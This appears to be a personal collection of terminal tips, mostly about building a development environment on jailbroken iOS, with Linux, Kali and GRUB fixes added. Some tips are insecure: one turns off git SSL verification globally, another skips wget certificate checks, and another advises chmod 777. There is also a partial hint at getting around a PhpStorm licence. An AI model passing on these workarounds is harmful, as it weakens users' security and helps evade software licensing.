+    To split vertically: ctrl + a then |.
+    To split horizontally: ctrl + a then S (uppercase one).
+    To unsplit: ctrl + a then Q (uppercase one).
+    To switch from one to the other: ctrl + a then tab
+
+Note: After splitting, you need to go into the new region and start a new session via ctrla then c before you can use that area.
+
+EDIT, basic screen usage:
+
+    New terminal: ctrl + a then c.
+    Next terminal: ctrl + a then space.
+    Previous terminal: ctrl + a then backspace.
+    N'th terminal ctrl + a then [n]. (works for n∈{0,1…9})
+    Switch between terminals using list: ctrla then " (useful when more than 10 terminals)
+    Send ctrl + a to the underlying terminal ctrl + a then a.
+
+
+
+
+
+
+____________________________ iPhone Development Environment Setup _______________________
+
+gamma-level.com
+On-iPhone Development Environment
+
+Often, for some of the trickier packages to build (like Emacs or most Python-based programs), it is easier to have a development environment on the device than to deal with a cross-compiler. The method I outline here is one way to get one. It takes up room, and it’s outdated, but it works for almost anything you’d want to do, if you put up with it.
+
+If you want to install any of the ports on this website, the best way to do that is through my Cydia repo. You do not need this development environment for those packages.
+
+I’m not going to pretend that this is the best way to do this. I developed this method by changing the one I used for OS 1.0 a little at a time when a new OS came out. It’s a bit of a hack right now, but it works. I point out where I think an improvement could be made.
+
+I’m going to assume you have a freshly jailbroken iPhone or iPad. Feel free to skip steps if you think you can.
+
+I’ve tried to write this as accurately as possible, but errors do happen. Feel free to contact me to work things out. Worst case scenario? You have to do a full restore of your device, which is annoying but not hard. Be sure to have backups, but it shouldn’t come to that!
+
+(Also, standard disclaimer: I claim no responsibility if somehow you make your device blow up, or otherwise fail, while using this guide.)
+
+For this guide, I’m going to assume at least passing familiarity with the unix shell. After all, you’re here for a development environment! Above that, I’ll try to explain what I feel is needed to continue.
+
+Finally, this guide was written for iOS 3.2 on the iPad. It shouldn’t be significantly different for similar versions on both the iPhone and iPad, though. Particularly, it seems to still work on a jailbroken iPad running iOS 4.2.1.
+
+Special thanks must go to Børre Ludvigsen, who patiently worked through this guide on his own and helped me iron out most of the bigger issues.
+
+Let’s get started!
+Getting Shell Access
+
+More than likely, since you’re here at all, you’ve already done this. It’s included here for completeness. Feel free to skip ahead!
+
+If you’ve just jailbroken, install the OpenSSH package. Also, installing the OpenSSH reconnect helper and Insomnia is a good idea. The helper will reconnect you automatically if you lose your shell connection, and Insomnia keeps that from happening at all. Nothing is more annoying that having to fidget with your device just to keep the Wifi up!
+
+You will also need to install “APT 0.7 Strict” and “Core Utilities” from Cydia. The first will let us easily install Cydia packages from the command line, which is a lot more convenient, and the second is handy for working on the command line.
+
+SSH in to your device with the username root and the password alpine. We’re going to change this now, for security, and then we’ll give the user mobile a password so we can log in without being root.
+
+iphone:~ root# passwd
+Changing password for root.
+New password: [type a password here]
+Retype new password: [repeat it here]
+iphone:~ root# passwd mobile
+Changing password for mobile.
+New password: [type a different or same password here]
+Retype new password: [again...]
+iphone:~ root# 
+
+Getting an Editor
+
+Right now we have no way of editing files. For now, I recommend installing nano. It’s lightweight and easy to wrap your head around. If you’ve never used it before, look around the web for a GNU nano tutorial. If nano‘s not your thing, you could also install vim or even emacs (though for emacs, you need my Cydia repository).
+
+iphone:~ root# apt-get install nano # or 'vim', or 'emacs', or...
+
+(Note: I usually run nano as nano -w, which keeps nano from automatically wrapping lines, which can ruin most configuration files.)
+Setting Up sudo
+
+Working as root is bad, very bad. I’ve accidentaly deleted my /usr once, bricking my iPad. However, it gets annoying to have to su into root every time you want to install something. So let’s install sudo!
+
+iphone:~ root# apt-get install sudo
+
+Now we need to edit the sudoers file to make sudo useful. We set the EDITOR environment variable to keep visudo from complaining that vi isn’t there. If you’le using vim, you can leave it out.
+
+iphone:~ root# EDITOR=nano visudo
+
+Right below the line that says “root ALL=(ALL) ALL“, write the similar line “mobile ALL=(ALL) ALL“, then save and exit.
+
+(Note: when you run sudo as mobile, it will ask you for a password sometimes. This is mobile‘s password, not root‘s.)
+Logging In as mobile
+
+Before we continue, we’re going to drop our superuser privelege. Log out and log back in as mobile. As a test, make sure sudo is working fine. It’ll give you a nice scary administration notice when you run it the first time, as a bonus!
+
+iphone:~ mobile$ sudo whoami
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: [type in mobile's password]
+root
+iphone:~ mobile$
+
+The last line saying root is the key: it means sudo is set up right and correctly giving you root access.
+Installing GCC and Friends
+
+Finally, we get to the fun part. First off, let’s install some general utilities for our development environment:
+
+iphone:~ mobile$ sudo apt-get install ldid make wget patch gawk
+
+Some explanation: ldid modifies programs to fake iPhone OS into running them like official binaries. make is the standard GNU build tool. We’ll use wget to fetch tarballs from the internet right in the terminal, and then patch to patch them. Autotools, which just about every package uses, needs gawk to run.
+
+Next, we’re going to install gcc itself, but if we just go and do it, we’ll run into a problem with the libgcc offered on Telesphoreo: it refuses to install, because it breaks the system. Instead, we’ll install the dummy package found here, and trick APT into thinking it’s already installed.
+
+iphone:~ mobile$ wget http://gammalevel.com/forever/fake-libgcc_1.0_iphoneos-arm.deb
+iphone:~ mobile$ sudo dpkg -i fake-libgcc_1.0_iphoneos-arm.deb
+
+Now we’re prepared to install gcc and some development headers. Note that these headers are compatibility headers, meant to ease the transition from iOS 1.0 to 2.0. That is, they are old. I only trust them for the standard POSIX headers, and even for that they fail in some parts. This is one place that could probably be improved: more on that later.
+
+iphone:~ mobile$ sudo apt-get install iphone-gcc com.bigboss.20toolchain
+
+If you’re anything like me, you’ll be itching to write a little “Hello, world!” program right now and try out your shiny new gcc. Well, you’d be dissappointed. These packages are so old that they need fixing first.
+Fixing What’s Broken
+Libraries
+
+Unfortunately, you have some downloading to do. Go fetch the iPhone Developer SDK. Once you have it, on a Mac, simply install it. If you’re not on a Mac, you’ll need an archive tool that reads DMGs and Mac packages. I know that 7zip works well on Windows, and probably works fine through Wine on other systems.
+
+We’ll be looking in the iPhoneOS3.2.sdk directory, but by all means change this version number if you need to. On a Mac with the installed official SDK, this is at “/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS3.2.sdk“. If you’re using 7zip, open the Xcode DMG, then the 5.hfs partition, which will take a while. Then, open up “iPhoneSDK/Packages/iPhoneSDKHeadersAndLibs.pkg” for the most recent version, or “.../iPhoneSDKXXX.pkg” for a different version. Inside that package, open Payload, then Payload~, then “.“. The directory we are looking for is then at “Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS3.2.sdk“.
+
+We need to copy libraries from the official SDK on to the device. scp works really well, if you have it: it transfers files over SSH. However, anything that gets files from your computer to your device will work.
+
+(Note for the interested: iPhoneOS is missing libraries to link against, so we’ll be copying them over. Later on, we’ll be editing system headers. Also, none of the frameworks on the device come with headers, so you’ll need to copy those over as you need them. It occurs to me that we might be able to just copy over the entire official SDK, and skip doing this by hand. It might work, but I haven’t tried it. For now, I just copy over whatever’s missing as I run into it. I would like to look into this, though.)
+
+In the directory iPhoneOS3.2.sdk/usr/lib, you will find the following files:
+
+libgcc_s.1.dylib
+libSystem.B.dylib
+libstdc++.6.0.9.dylib
+libiconv.2.dylib
+
+We need to copy these files to mobile‘s home directory, /var/mobile, on the device. Once there, reopen your shell on your device and move them to /usr/lib:
+
+iphone:~ mobile$ sudo mv *.dylib /usr/lib/
+
+We also need to reconstruct a few symlinks:
+
+iphone:~ mobile$ sudo ln -s /usr/lib/libSystem.B.dylib /usr/lib/libSystem.dylib
+iphone:~ mobile$ sudo ln -s /usr/lib/libSystem.dylib /usr/lib/libc.dylib
+iphone:~ mobile$ sudo ln -s /usr/lib/libSystem.dylib /usr/lib/libm.dylib
+iphone:~ mobile$ sudo ln -s /usr/lib/libSystem.dylib /usr/lib/libpthread.dylib
+
+iphone:~ mobile$ sudo ln -s /usr/lib/libstdc++.6.0.9.dylib /usr/lib/libstdc++.6.dylib
+iphone:~ mobile$ sudo ln -s /usr/lib/libstdc++.6.dylib /usr/lib/libstdc++.dylib
+
+iphone:~ mobile$ sudo ln -s /usr/lib/libiconv.2.dylib /usr/lib/libiconv.2.4.0.dylib
+
+We also need to copy over some key C++ headers. In iPhoneOS3.2.sdk/usr/include/c++/4.0.0/arm-apple-darwin9, there is a directory named bits. Copy that directory and all it contains to your device, then install it:
+
+iphone:~ mobile$ sudo mkdir /var/include/c++/4.0.0/arm-apple-darwin9
+iphone:~ mobile$ sudo mv bits /var/include/c++/4.0.0/arm-apple-darwin9/
+iphone:~ mobile$ sudo ln -s /var/include/c++/4.0.0/arm-apple-darwin9/{,v6}
+iphone:~ mobile$ sudo ln -s /var/include/c++/4.0.0/arm-apple-darwin{9,8}
+iphone:~ mobile$ sudo ln -s {/var,/usr}/include/c++
+
+Not only are there critical system libraries missing, but some of the headers are just plain wrong, too. It seems that somewhere along the line, iPhone OS moved from a 32 bit inode to a 64 bit inode, so there are a lot of structures defined in these headers that have the wrong size.
+
+(Note for the interested: Beleive me when I say that hunting down bugs in system headers is a nightmare. Just keep in mind, if you seem to be getting random segfaults for no reason, or some extremely subtle bug that has no reason to exist, it’s probably a system header error I haven’t found yet! Compare the given headers with the ones from Apple, with __DARWIN_64_BIT_INO_T defined.)
+
+First off, we’re going to edit “/private/var/include/sys/stat.h“. Make sure to edit with sudo, so you have write permissions! In struct stat, remove the line that says:
+
+ino_t           st_ino;         /* [XSI] File serial number */
+
+Between the entries for st_nlink and st_uid, add this line:
+
+__uint64_t      st_ino;         /* [XSI] File serial number */
+
+After the entry for st_ctimespec, add this line:
+
+struct timespec st_birthtimespec;       /* time of file creation */
+
+Finally, after the entries for st_ctime and st_ctimensec, add these lines:
+
+time_t          st_birthtime;           /* [XSI] Time of file creation */
+long            st_birthtimensec;       /* nsec of file creation */
+
+We’re also going to edit “/private/var/include/sys/dirent.h“. First, we’re going to change the definition of __DARWIN_MAXNAMLEN:
+
+#define __DARWIN_MAXNAMLEN      1023
+
+In the definition of struct dirent, remove the line at the top that says
+
+ino_t d_ino;            /* file number of entry */
+
+In its place, write in:
+
+__uint64_t d_ino;       /* file number of entry */
+__uint64_t d_seekoff;
+
+Between the entries for d_reclen and d_type, write in:
+
+__uint16_t d_namlen;    /* length of string in d_name */
+
+Finally, between the entries for d_type and d_name, remove the line that says:
+
+__uint8_t d_namlen;     /* length of string in d_name */
+
+That’s it!
+Minor Details
+
+Some configure scripts and Makefiles (like Emacs’s) looks for the C compiler under cc, which is supposed to exist on standard setups. Since we emphatically don’t have a standard setup, we have to make a link.
+
+iphone:~ mobile$ sudo ln -s /usr/bin/gcc /usr/bin/cc
+
+Apparently sometimes the GCC you get won’t search /var/include, which is where all the standard C headers are located. To fix this, add the following lines to ~/.profile:
+
+export C_INCLUDE_PATH=/var/include
+export CPLUS_INCLUDE_PATH=/var/include
+export OBJC_INCLUDE_PATH=/var/include
+
+Make sure to log out and log back in for these changes to take effect.
+Testing your GCC
+
+If you feel so inclined, now would be the time to test out your build environment. GCC works exactly as it does on Mac OS X, that is, exactly like on other systems, but with added options for linking with frameworks. Keep in mind, you may need to sign your programs before they’ll run. I have found that I don’t, but you may need to. If your program crashes for no reason when you start it, you need to run
+
+iphone:~ mobile$ ldid -S program_name
+
+There’s some way to change the system so you don’t ever need to do this, but last I heard there were some long-term side-effects.
+You’re Done!
+
+Congratulations!
+
+
+
+_________________________SOLUTION C++ Darwing - iPhone ________________________
+This works great .. I also had to do what welf said for the g++ prog to work
+
+Here is all the stuff that I had to do:
+wget http://aaronash.com/iphone/fake-libgcc_1.0_iphoneos-arm.debdpkg -i fake-libgcc_1.0_iphoneos-arm.deb
+apt-get install com.bigboss.20toolchain
+apt-get install iphone-gcc
+export CPLUS_INCLUDE_PATH=/private/var/include/c++/4.0.0:/private/var/include/c++/4.0.0/i686-apple-darwin9
+
+	ln -s /usr/lib/libstdc++.6.0.9.dylib /usr/lib/libstdc++.dylib
+
+
+
+
+
+dpkg -l libstdc++*
+
+
+_____________________dmg2img _____Open dmg file in linux_______________________
+dmg2img file.dmg imagefile.img
+
+
+sudo mount -o loop -t hfsplus imagefile.img /mnt
+
+In this way, the file imagefile.img is a result from dmg2iso and the contents will be available at /mnt. If the hfsplus type is not detected, you might need to load the kernel module for it:
+
+sudo modprobe hfsplus
+
+When done, you can unmount it by running:
+
+sudo umount /mnt
+sudo apt-get install ccd2iso
+
+I tried to convert the file but I got what it seems a common error
+$ ccd2iso input_file.img output_file.iso
+  Unrecognized sector mode (0) at sector 0!
+________________________wordpress localhost:21 FTP error ________________________
+
+cd /var/www/html/wordpress
+run : chown -R www-data:www-data *
+
+Theme will install normally now..
+
+
+
+
+
+#########################Java update terminal########################
+mkdir /opt/java && cd /opt/java
+
+--------------- For 64-bit Systems --------------
+cd /opt/java
+wget --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie" "http://download.oracle.com/otn-pub/java/jdk/8u45-b14/jdk-8u45-linux-x64.tar.gz"
+tar -zxvf jdk-8u45-linux-x64.tar.gz
+
+cd jdk1.8.0_45/
+update-alternatives --install /usr/bin/java java /opt/java/jdk1.8.0_45/bin/java 100  
+update-alternatives --config java
+
+update-alternatives --install /usr/bin/javac javac /opt/java/jdk1.8.0_45/bin/javac 100
+update-alternatives --config javac
+
+update-alternatives --install /usr/bin/jar jar /opt/java/jdk1.8.0_45/bin/jar 100
+update-alternatives --config jar
+
+export JAVA_HOME=/opt/java/jdk1.8.0_45/	
+export JRE_HOME=/opt/java/jdk1.8.0._45/jre 	
+export PATH=$PATH:/opt/java/jdk1.8.0_45/bin:/opt/java/jdk1.8.0_45/jre/bin
+
+java -version
+___________________________ SSH Configuration iPhone After first jailberak_______________________
+Update Client Configuration
+
+sudo vi /etc/ssh/ssh_config
+
+Replace this line:
+
+# GSSAPIKeyExchange yes
+
+by:
+
+GSSAPIKeyExchange no
+
+Don't forget to remove the sharp!
+Update Server Configuration
+
+sudo vi /etc/ssh/sshd_config
+
+Replace this line:
+
+#UseDNS yes
+
+by:
+
+UseDNS no
+
+Again, don't forget to remove the sharp. That's it ! 
+
+from cydia install SBSetting swip top desktop and see options
+
+
+____________________iPhone ios 9.3.2____________________
+mercurial ---> hg (bitbuket)
+git clone ----> git
+
+
+You need the APT 0.6 transitional package to work with apt-get install ....
+
+to install latest python follow me:
+https://www.ryleyangus.com/Python-2.7.8-arm64.zip
+or install 
+https://ryleyangus.com/repo/deb_files/python_2.7.8-1_iphoneos-arm.deb
+https://ryleyangus.com/repo/deb_files/Cheetah-2.4.4-iphoneos-arm64.deb
+https://ryleyangus.com/repo/deb_files/libdb-arm64-4.8-30.deb
+https://ryleyangus.com/repo/deb_files/libffi-arm64-3.1.deb
+https://ryleyangus.com/repo/deb_files/ncurses-arm64-5.9.deb
+https://ryleyangus.com/repo/deb_files/openssl-arm64-1.0.1j.deb
+https://ryleyangus.com/repo/deb_files/readline-arm64-6.3.deb
+
+Execute LDID with FULL Path
+
+If you try to run Python right now, you'll get the infamous error that we've all come to know and hate:
+
+Killed:9
+
+To fix it, for the Python executable, at least, and potentially any other executable that is installed, make sure to run "ldid -S" as root on those files. A very common mistake that I do is that when I run that command, I don't specify the full pathname, which is required for LDID to be effective.
+
+I.e., for the Python executable, run sudo ldid -S /usr/bin/python
+
+
+Illegal instruction: 4 solution:
+
+sed -i'' 's/\x00\x30\x93\xe4/\x00\x30\x93\xe5/g;s/\x00\x30\xd3\xe4/\x00\x30\xd3\xe5/g;' ios_binary
+
+ldid -S ios_binary
+
+
+
+
+
+Repository ininjas mirrored to: http://starwarsfan2099.x10host.com/repo
+
+
+Testing configuration with 64 bit arm cpu:
+
+././configure --srcdir=.. --enable-builddir=aarch64-apple-darwin14 --host=aarch64-apple-darwin14 --build=aarch64-apple-darwin14 build_alias=aarch64-apple-darwin14 host_alias=aarch64-apple-darwin14
+
+
+
+______________________fatal: unable to access 'https://github.com/ninja-build/ninja.git/': SSL certificate problem: unable to get local issuer certificate_________________________
+
+git config --global http.sslVerify false
+
+
+________________export to profile________________
+echo "export CXX=/usr/local/bin/g++" >> ~/.profile
+
+
+______________ ininjas repo alternative ____________
+new repo cydia address: http://crak.cn/repo All hacking tools i.e ettercap iath ipwn arp-scan inter metasploit... Good work run inter -x
+
+_____________________________ Cydia Repo __________________________
+
+    http://apt.thebigboss.org/repofiles/cydia/ - The BigBoss; The largest default repository.
+    http://apt.saurik.com/ - Jay Freeman (Saurik); Contains important software for jailbreak, as well as development tools.
+    http://apt.modmyi.com/ - ModMyi; 2nd largest default repository.
+    http://cydia.zodttd.com/repo/cydia - ZodTTD and MacCiti; Hosts primarily themes and etc.
+
+Developer/Tweak-Specific
+
+    http://repo.alexzielenski.com/ - Alex Zielenski; TinyBar
+    http://apt.steverolfe.com/ - Chewmieser; FreeFall, StatusVol
+    http://cydia.myrepospace.com/beta/sf - CokePoke; Phantom for Snapchat
+    http://cydia.myrepospace.com/cokepokes/ - /u/CokePokes - @CokePokes
+    http://coolstar.org/publicrepo/ - CoolStar; Classic Apps/Fonts/Badges, ThemeLib
+    http://repo.cpdigitaldarkroom.com/ - CP Digital Darkroom; Abeo, Agape, Blurcons/Slide2 , HideMe8
+    http://danyl.net/repo/ - Danyl Lisiansky; CCControls, Sicarius
+    http://cydia.hbang.ws/ - HASHBANG Productions; Cobalia, TypeStatus, Unofficial VLC
+    http://elijahandandrew.com/repo - Elijah and Andrew; ReachApp, TouchID Everywhere
+    http://exile90software.com/cydia/beta - Exile.90; iCleaner Pro Beta (If there is one)
+    http://exile90software.com/cydia - Exile.90; iCleaner Pro
+    http://betarepo.com/fontme/ - FontMe; More fonts
+    http://cydia.itaysoft.com/ - Itaysoft; iCaughtU Pro (iOS 4-8)
+    http://cydia.angelxwind.net - Karen (angelXwind); First-Aid Kit, Mikoto, NO PLS RECOVERY, PreferenceOrganizer 2, PPSSPP
+    http://repo.pnre.co/ - pNre; NoAnnoyance
+    http://cydia.qusic.me/ - Qusic's Betas; Xgress (Hides jailbreak from Ingress game)
+    http://rcrepo.com/ - Reddit Community Repo; Community made theming, Go.Away.Period.Button, ReachaDickbutt, Snowswitch
+    http://rpetri.ch/repo/ - Ryan Petrich; Activator and Flipswitch betas, SmartClose
+    http://mirrors.xbmc.org/apt/ios/ - Team Kodi; Kodi (xbmc for iOS)
+    http://mirrors.kodi.tv/apt/ios/ - Team Kodi; Kodi (xbmc for iOS)(New repo)
+    http://nix.howett.net/theos/ - Howett; Theos (for developing for iOS, on iOS)
+    http://repo.thireus.com/ - Thireus; Untrusted Hosts Blocker
+    http://repo.tylercasson.com/ - Tyler Casson; Möbius (Infinite Springboard scrolling)
+    http://repo.bd452.com - bd452; Upscale, DietBar
+    http://repo.tm3dev.com - xTheMaster3x; NoBlur, ReachAll
+    http://tateu.net/repo - tateu; Perpetual (leaves notification on lockscreen after unlock)
+    http://cydia.myrepospace.com/andrewwiik/ -
+    http://chewitt.me/repo/ - Charlie Hewitt; Couria, CustomCover
+    http://chickenmatt5.github.io/repo/ - Chickenmatt5; Cydia Refresh Timeouts
+    http://cydia.myrepospace.com/jormy/ - Jormy; nin
+    http://cydia.jerryen.com/ - JerryEn; AppHide, CCSliders
+    http://repo.gsquared.io/ - gsquared; NoTouchCancelReply
+    http://cydia.myrepospace.com/rj619/ - rj619; Dark Splashscreens for Eclipse shivadoc - MyRepoSpace.com
+    http://cydia.myrepospace.com/shivadoc/ - /u/shivadoc; Priority Hub SkumarSpace - MyRepoSpace.com
+    http://cydia.myrepospace.com/SkumarSpace/ SkumarSpace; NoChevron
+    http://cydia.myrepospace.com/DomT4/ - DomT4; ClearSans Font
+    http://iPHONiX.myrepospace.com/ - /u/iPHONiX; Various themes and iWidgets
+    http://dbk1ng.myrepospace.com/ - /u/dbk1ng - @dbk1ng; Fonts
+    http://insanj.com/repo/ - /u/insanj - @insanj; Dater, Stamper
+    http://cydia.myrepospace.com/PoomSmart/ - @PoomSmart; Live Wallpaper Enabler 7.0.x
+    http://cydia.myrepospace.com/pw5a29ip4/ - ? ; Various iOS 7 tweaks
+    http://cydia.myrepospace.com/ImLemonPartying - @ImLemonPartying; has a lot of Lockscreen Themes for use with Cydget
+    http://cydia.myrepospace.com/jontelang - /u/jontelang - @jontelang; Stick, TimePIN
+    http://cydia.myrepospace.com/reeiiko - /u/Reeiiko - @reeiiko; Theming
+    http://cydia.myrepospace.com/ruberto - /u/cheddarburrito; Dark Splash Screen for use with Eclispe (Requires Winterboard)
+    http://cydia.myrepospace.com/kshizoku - /u/KShizoku - @KShizoku; 2x2 folder icons for iOS 7
+    http://cydia.myrepospace.com/kohidevice - Widget Weather Team; Widget Weather
+    http://cydia.myrepospace.com/ip4ever - ip4ever; NoCyAds
+    http://cydia.myrepospace.com/Basic - Basic; ADBlocker7
+    http://cydia.myrepospace.com/iLEXiNFO - /u/iLEXiNFO - @iLEXiNFO; iLEX RAT
+    http://cydia.expetelek.com - Expetelek; SimpleRespring, truepasscode
+    http://Wynd07.appspot.com/r7/ - wynd; iSwipeKeyboard, DreamBoard (iOS 7 beta)
+    http://test-cydia.bitesms.com/- Bitesms for iOS 7 - @bitesms - Support
+    http://apt.if0rce.com - @if0rce; AirBlue addons
+    http://getdelta.co/ - /u/somethingpunk - @punksomething; Flex2 Beta
+    http://hitoriblog.com/apt/ - Moyashi; Primarily tweaks for iOS 7 and below
+    http://n00neimp0rtant.com/repo/ - @n00neimp0rtant; xCon
+    http://repo.yllier.net/ - /u/_Yllier_ - @Yllier; AdBlockerNetworks
+    http://www.tateu.net/repo/ - /u/tateu; OpenNotifier for iOS 7
+    http://4khmeriphone.com/sp/ - 5 Rows Keyboard
+    http://repo.maxkatzmann.us/ - JellyLock (iOS 6) - /u/maxkatzmann - @max_katzmann
+    http://cydia.myrepospace.com/ieatgiraffe - /u/ieatgiraffe; reddit-requested zeppelin logos
+    http://repo.iphonews.ro - /u/iphonewsro - @iPhoNewsRO; MessagesEnhancer
+    http://justgetflux.com/cydia - F.lux
+    http://cydia.myrepospace.com/mlnlover11/ - /u/mlnlover11 - @mlnlover11; Appelancy
+    http://apt.dba-technologies.com/beta - DNA Technologies; LockInfo 7 (Beta)
+    http://repo.winneon.moe/ - /u/WinneonSword; Themes for GroovyLock and LockHTML3
+    http://kuaidial.googlecode.com/svn/deb/ - KuaiDail and KuaiDail addons - Home - Support http://cydia.myrepospace.com/seatanners/ - /u/seatanners - @SeaTanners; Unifaces tweak (enter ASCII faces through a keyboard shortcut)
+    http://cydia.ianburns.co/ - /u/Ianb821; Blurrylock beta
+    http://cydia.rob311.com/repo/ - rob311; Activator/Flipswitch addons, Procrastinator
+    http://cydia.r333d.com/ - Reed Weicheler; Cylinder, EqualizerEverywhere betas (If Available)
+    http://arcetera.github.com/ - arcticSn0w; gba4ios, nds4ios, MarkAsRead
+    http://repo.nesolabs.de/ - NESO Security Labs GmbH; Snoop-it
+    http://noeliel.com/repo/ - Noeliel; BatBar, Catapult, NCWallpaper, Passlog, TimeCarrier, TinyCons
+    http://greenydev.github.io/repo/ Greeny; CenterStage, VoIPRemover
+    http://cydia.myrepospace.com/blubbll/ - Bubbul; Soon to be Safelock
+    http://apt.s1ris.com - S1ris; BDaySpotify
+    http://mcpe.s1ris.com - S1ris and friends; MCPE Mods
+    http://tigisoftware.com/cydia - TIGI Software; Filza, Snapchat Log
+    http://typ0s2d10.appspot.com/repo - TypoStudio; tsProtector
+    http://cydia.grimore.org/ - Wizardry and Steamworks; Clux, joe
+    http://ios-webstack.tk/cydia/ - iOS WebStack; various networking and hosting packages
+    http://yangapp.googlecode.com/svn/ - Linus Yang; Various dev tools
+    http://willfeeltips.appspot.com/apt/ - Ichitaso; addons, tweaks and utilities
+    http://ftp.sident.net/cydia-beta/ - Rio; utilities, breakthrough prevents jailbreak detection.
+    http://cydia.hiraku.tw/ - Hiraku; tweaks, addons.
+    http://cydia.evilpengu.in/ - EvilPenguinl; Various tweaks
+    http://danieltaylor.tk/repo - Daniel Taylor; Themes
+    http://cydia.myrepospace.com/d4rkh0rse/ - D4kh0rse; HideSensitive
+    http://cydia.clezz.com/ - Ma Jun; Dock (Mac OS X like{cool}), QuickDo, ShakeMe
+    http://cydia.myrepospace.com/Skylerk99/ - Skylerk99; Ghostprefs, Notate, ConvoPics
+    http://repo.nielstron.de - Logos for OpenNotifier, Zeppelin, LockGlyph, Respring, etc
+    http://repo.cydro.us - Adit (Cydro); iOS Emoji Font, iOS 8.3 Emoji Font, Emoji83, EmojiLayout
+    http://repo.aleksanderazizi.com - /u/AlekaanderAzizi; Nighty, TinyWool
+    http://repo.aethericdevteam.org - AethericDevTeam's Repo; SavageSiri
+    http://thirdeyeruler.com/repo/ - /u/ThirdEyeRuler 's repo; Wide Bubbles, noTumblrAds
+    http://filippobiga.com/repo - Filipobiga's repo; Keyfault, SkipLock * **
+
+___________________________________ Problem With architecture _____________________
+ARCHFLAGS="-arch armv6 -Wno-error=unused-command-line-argument-hard-error-in-future" pip install numpy
+
+
+Error:
+-----------
+C compiler: gcc -fno-strict-aliasing -I/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/usr/include/ 
+-I/Users/linusyang/Documents/Code/python/python-for-ios/prelib/usr/include -arch armv6 -pipe -DNDEBUG -g 
+-O3 -Wall -Wstrict-prototypes
+
+compile options: '-Inumpy/core/src/private -Inumpy/core/src -Inumpy/core -Inumpy/core/src/npymath 
+-Inumpy/core/src/multiarray -Inumpy/core/src/umath -Inumpy/core/src/npysort -I/usr/include/python2.7 -c'
+gcc: _configtest.c
+cc1: error: unrecognized command line option "-arch"
+cc1: error: unrecognized command line option "-arch"
+failure.
+removing: _configtest.c _configtest.o
+
+
+Solutions:
+
+export CFLAGS=-Qunused-arguments
+export CPPFLAGS=-Qunused-arguments
+
+do numpy install now 
+python setup.py install
+___________________________________________________________________________________________________________
+
+					####### Broken Menu fix ###############
+Remove and purge Kali-Menu
+
+apt-get remove --purge kali-menu && apt-get clean
+
+Remove local applications in your profile
+
+rm -rf .local/share/applications
+
+Remove Kali Menus from .config
+
+rm -rf .config/menus
+
+Reboot your machine
+
+reboot
+
+Reinstall Kali-Menu
+
+apt-get install kali-menu -y
+
+If this doesn’t solve the menu problem, only then move to next step.
+Reinstall Kali-linux-full
+
+apt-get install kali-linux-full -y
+
+_______________________________ Kali linux login stuck problem solution _______________________
+apt-get install gnome
+apt-get install gnome-shell
+apt-get install gdm3
+apt-get update
+apt-get upgrade
+
+_________________________________ Boot : grub rescu> ________________
+grub rescue> ls
+> ls (hd0,msdos8)
+check all like this....
+if output is filesystem ext2
+then..
+
+>set root=(hd0,msdos8)
+>set prefix=(hd0,msdos8)/boot/grub
+update-grub
+grub-install /dev/sda
+
+
+################################### phpstrom problem solution ##########################
+If you get a "The license CNEKJPQZEX has been cancelled.", you can append "0.0.0.0 
+
+#####################################################################
+How To Make Deb Files
+So you made something awesome that you want to share with the iDevice community, but don't know how to go about that.  You see these deb files and think "If only I could make those, that would be perfect," but alas you do not know how.  Well this tutorial is here to change that!
+A deb file is Farley simiple to make; It consisted of two parts, the stuff that you want to give everyone, and then a DEBIAN folder.  Let's start:
+
+1) Create a folder, give it any name you want. This folder will need to endup on your ipod so it might just be easiest to create it on there.  
+2) Create a subfolder called "DEBIAN" just like that, all caps no quotes.
+3) Create a new text file in the DEBIAN folder name it "control" this is what contains the instructions for the packaging.
+4) Open up the control file with your favorite text editor and copy and paste this code into it:
+
+Package: com.Your.Identifier
+Name: Friendly Package Name 
+Version: 1.0
+Architecture: iphoneos-arm
+Description: Write what it does here
+Section: Cydia's category 
+
+  
+Hopefully you can figure our what each tag does, Make sure that you do not change the capitalization of any of the tags.  
+The 'Package:' tag is string that the os will use to identify this package.  It should look like a backwards web address:
+
+com.something.something
+
+
+Next the 'Name:' tage is what people will see in cydia, put down what ever you want here
+'Version:' This is the version number duh
+'Architecture: iphoneos-arm' don't change this, otherwise your package won't install
+'Description:' this what users will see as the description of the package in Cydia
+'Section:'  This will tell Cydia which category to put your package in, Games, Tweaks, Administration are some examples.  Be sure to use proper capitalization.  
+
+
+5) Once all of that is done move back to top folder (the folder that has the DEBIAN folder in it) and make some more folders.  Think about this folder as the / folder on your device. Build a folder structure identical to where you want your package to go. if you want it to go in /usr/bin (location for commands) create a folder called usr and a subfolder called bin. Double check your capitalization! 
+6) Once that is all done move everything to your iDevice if you haven't already, and set the permissions.  If you want to be able to run a program make sure you have the execute permission set.  'chmod 777 file' this  will give everyone complete access to a file read, write, and execute.  
+7) Now the last step.  Open up putty or mobile terminal and navigate to the directory that you created then 'cd ..' this will take you to the directory one step above your current directory.  Then run 'dpkg-deb -b foldername outputfilename.deb' 
+
+Ignore the warnings that it gives you and wait a few seconds and your all done! Be sure to give it an output file name, otherwise you will have an extra file in your deb file that may conflict with other packages.  
+
+Leave Comments if you have any questions or just want to know more.  Hope that this helps all of you! 
+~Trcx
+
+$$$$$$$######################## apt-get install lock problem$$$$$#%##############
+rm /var/lib/dpkg/lock
+dpkg --configure -a
+rm /var/lib/apt/lists/lock
+rm /var/cache/apt/archives/lock
+apt-get update
+
+__________________________________________________________________ Profile ____________________________________ iPhone _________________
+  GNU nano 2.2.6                                  File: /var/root/.profile                                                                  Modified  
+
+export C_INCLUDE_PATH=/var/include:/usr/include/python2.7:/var/include/c++/4.0.0/arm-apple-darwin9
+export CPLUS_INCLUDE_PATH=/private/var/include/c++/4.0.0:/private/var/include/c++/4.0.0/i686-apple-darwin9:/usr/include:/usr/include/python2.7
+export OBJC_INCLUDE_PATH=/var/include:/usr/include/python2.7
+
+export CC=/usr/bin/gcc
+export CXX=/usr/bin/g++
+export CPP=/usr/bin/cpp
+export CXXCPP="/usr/bin/cpp"
+export LD=/usr/bin/ld
